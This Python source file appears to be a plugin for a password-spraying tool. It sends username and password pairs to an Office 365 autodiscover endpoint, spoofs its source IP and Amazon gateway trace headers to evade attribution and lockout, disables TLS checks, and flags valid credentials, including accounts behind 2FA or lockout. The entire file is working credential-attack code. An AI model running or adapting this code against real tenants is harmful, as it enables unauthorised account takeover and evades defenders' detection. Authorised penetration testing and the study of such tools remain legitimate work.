import requests
import utils.utils as utils
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def o365_authenticate(url, username, password, useragent, pluginargs):

    data_response = {
        'result': None,    # Can be "success", "failure" or "potential"
		'error' : False,
        'output' : "",
        'valid_user' : False
    }

    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    headers = {
        'User-Agent': useragent,
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,

        "Content-Type": "text/xml"
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    try:
        r = requests.get(f"{url}/autodiscover/autodiscover.xml", auth=(username, password), headers=headers, verify=False, timeout=30)

        if r.status_code == 200:
            data_response['output'] = f"[+] SUCCESS: {username}:{password}"
            data_response['result'] = "success"
            data_response['valid_user'] = True

        elif r.status_code == 456:
            data_response['output'] = f"[+] SUCCESS: {username}:{password} - 2FA or Locked"
            data_response['result'] = "success"
            data_response['valid_user'] = True

        else:
            data_response['output'] = f"[-] FAILURE: {username}:{password}"
            data_response['result'] = "failure"

    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
